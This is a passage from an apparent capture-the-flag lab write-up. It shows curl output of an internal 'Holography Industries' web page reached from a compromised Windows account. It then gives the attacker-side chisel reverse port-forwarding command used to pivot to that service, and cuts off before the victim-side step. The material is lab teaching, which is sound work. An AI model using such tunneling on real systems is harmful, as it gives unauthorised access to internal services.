<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>C:\Users\tstark\Downloads<span style="color:#ff79c6">&gt;</span>curl <span style="color:#ff79c6">-</span>X GET <span style="color:#bd93f9">127.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.1</span>:<span style="color:#bd93f9">8083</span>
</span></span><span style="display:flex;"><span>curl <span style="color:#ff79c6">-</span>X GET <span style="color:#bd93f9">127.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">0.1</span>:<span style="color:#bd93f9">8083</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">%</span> Total    <span style="color:#ff79c6">%</span> Received <span style="color:#ff79c6">%</span> Xferd  Average Speed   Time    Time     Time  Current
</span></span><span style="display:flex;"><span>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span style="display:flex;"><span>  <span style="color:#bd93f9">0</span>     <span style="color:#bd93f9">0</span>    <span style="color:#bd93f9">0</span>     <span style="color:#bd93f9">0</span>    <span style="color:#bd93f9">0</span>     <span style="color:#bd93f9">0</span>      <span style="color:#bd93f9">0</span>      <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>     <span style="color:#bd93f9">0</span><span style="color:#ff79c6">&lt;!</span>doctype html<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>html lang<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;en&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>head<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span> Required meta tags <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>meta charset<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;utf-8&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>meta name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewport&#34;</span> content<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width=device-width, initial-scale=1, shrink-to-fit=no&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span> Bootstrap CSS <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>link rel<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;stylesheet&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;css/squarely.css&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span>common<span style="color:#ff79c6">.</span>css  <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>link rel<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;stylesheet&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;css/common.css&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>title<span style="color:#ff79c6">&gt;</span>Holography Industries<span style="color:#ff79c6">&lt;/</span>title<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;/</span>head<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>body<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;!--</span>navbar <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>nav <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbar navbar-expand-lg navbar-dark bg-primary&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>a <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbar-brand&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span><span style="color:#ff79c6">&gt;</span>Business<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>button <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbar-toggler&#34;</span> type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;button&#34;</span> data<span style="color:#ff79c6">-</span>toggle<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;collapse&#34;</span> data<span style="color:#ff79c6">-</span>target<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#navbarNav&#34;</span> aria<span style="color:#ff79c6">-</span>controls<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbarNav&#34;</span> aria<span style="color:#ff79c6">-</span>expanded<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;false&#34;</span> aria<span style="color:#ff79c6">-</span>label<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Toggle navigation&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>span <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbar-toggler-icon&#34;</span><span style="color:#ff79c6">&gt;&lt;/</span>span<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;/</span>button<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;collapse navbar-collapse&#34;</span> id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbarNav&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>ul <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;navbar-nav ml-auto&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>li <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-item active&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>a <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-link&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span><span style="color:#ff79c6">&gt;</span>Home <span style="color:#ff79c6">&lt;</span>span <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sr-only&#34;</span><span style="color:#ff79c6">&gt;</span>(current)<span style="color:#ff79c6">&lt;/</span>span<span style="color:#ff79c6">&gt;&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;/</span>li<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>li <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-item&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>a <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-link&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;resume.php&#34;</span><span style="color:#ff79c6">&gt;</span>Submit Application<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;/</span>li<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>li <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-item&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>a <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-link&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span><span style="color:#ff79c6">&gt;</span>Services<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;/</span>li<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>li <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-item&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>a <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;nav-link&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span><span style="color:#ff79c6">&gt;</span>About<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;/</span>li<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>ul<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>nav<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;hero-header&#34;</span> style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;background-image: url(&#39;img/business.jpg&#39;)&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;header&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>h1<span style="color:#ff79c6">&gt;</span>Holography Industries<span style="color:#ff79c6">&lt;/</span>h1<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>World leader <span style="color:#ff79c6">in</span> Holographic Technologies<span style="color:#ff79c6">&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span>main content<span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;container mb-4 mt-4&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;row&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;col-md-8 mb-3&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>h2<span style="color:#ff79c6">&gt;</span>About us<span style="color:#ff79c6">&lt;/</span>h2<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>hr<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>We are all incredibly passionated about holograms at Holography Industries<span style="color:#ff79c6">.</span> We strongly believe that we are contributing to a brighter future <span style="color:#ff79c6">for</span> humanity<span style="color:#ff79c6">.&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>Life<span style="color:#f1fa8c">&#39;s all about evolution : And we are doing just that.&lt;/p&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>a href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;btn btn-primary&#34;</span><span style="color:#ff79c6">&gt;</span>Make a Phone call<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;col-md-4 align-items-center d-md-flex&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>img <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;img-fluid&#34;</span> src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;img/girl.jpg&#34;</span> alt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;lapi_girl&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;!--</span><span style="color:#bd93f9">3</span> cards<span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;container-fluid mb-4&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;row bg-light p-md-5&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;col-md-4 mb-3&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>img <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-img-top&#34;</span> src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;img/1.jpg&#34;</span> alt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-body&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Know more about us<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>Our Offices are currently all located <span style="color:#ff79c6">in</span> New York<span style="color:#ff79c6">.</span> If you would like to work with us, pay us a visit<span style="color:#ff79c6">!&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-footer&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>button <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;btn btn-primary&#34;</span><span style="color:#ff79c6">&gt;</span>Find out more<span style="color:#ff79c6">!&lt;/</span>button<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;col-md-4 mb-3&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>img <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-img-top&#34;</span> src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;img/2.jpg&#34;</span> alt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-body&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>What we <span style="color:#ff79c6">do</span>?<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>Just a bunch of passionate engineers trying to make the world a better place <span style="color:#ff79c6">for</span> everyone<span style="color:#ff79c6">!&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-footer&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>button <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;btn btn-primary&#34;</span><span style="color:#ff79c6">&gt;</span>Find out more<span style="color:#ff79c6">!&lt;/</span>button<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;col-md-4 mb-3&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>img <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-img-top&#34;</span> src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;img/3.jpg&#34;</span> alt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-body&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Contact Us<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#ff79c6">&lt;</span>p<span style="color:#ff79c6">&gt;</span>You can either contact us by email <span style="color:#ff79c6">or</span> by phone<span style="color:#ff79c6">.</span> HolographyTech@HolographyTechnologies<span style="color:#ff79c6">.</span>htb <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">514</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">000</span><span style="color:#ff79c6">&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;card-footer&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">100</span>  <span style="color:#bd93f9">5113</span>  <span style="color:#bd93f9">100</span>  <span style="color:#bd93f9">5113</span>    <span style="color:#bd93f9">0</span>     <span style="color:#bd93f9">0</span>  <span style="color:#bd93f9">1492</span>k      <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span> <span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span>:<span style="color:#ff79c6">--</span> <span style="color:#bd93f9">1664</span>k
</span></span><span style="display:flex;"><span>utton <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;btn btn-primary&#34;</span><span style="color:#ff79c6">&gt;</span>Find out more<span style="color:#ff79c6">!&lt;/</span>button<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span>footer<span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;py-3 bg-light text-center&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>p <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;m-0&#34;</span><span style="color:#ff79c6">&gt;</span>Copyright By <span style="color:#ff79c6">&lt;</span>a href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;#&#34;</span><span style="color:#ff79c6">&gt;</span>holographictech<span style="color:#ff79c6">.</span>htb<span style="color:#ff79c6">&lt;/</span>a<span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">2030</span><span style="color:#ff79c6">&lt;/</span>p<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/</span>div<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span> Optional JavaScript <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!--</span> jQuery first, then Popper<span style="color:#ff79c6">.</span>js, then Bootstrap JS <span style="color:#ff79c6">--&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>script src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://code.jquery.com/jquery-3.3.1.slim.min.js&#34;</span> integrity<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo&#34;</span> crossorigin<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;anonymous&#34;</span><span style="color:#ff79c6">&gt;&lt;/</span>script<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>script src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js&#34;</span> integrity<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1&#34;</span> crossorigin<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;anonymous&#34;</span><span style="color:#ff79c6">&gt;&lt;/</span>script<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>script src<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&#34;</span> integrity<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM&#34;</span> crossorigin<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;anonymous&#34;</span><span style="color:#ff79c6">&gt;&lt;/</span>script<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;/</span>body<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/</span>html<span style="color:#ff79c6">&gt;</span>
</span></span></code></pre></div><p>Let&rsquo;s use <code>chisel</code> and forward the port and connect to it.</p>
<p><code>Attacker Machine</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>chisel server -p 4444 --reverse
</span></span></code></pre></div><p><code>Victim Machine</code></p>
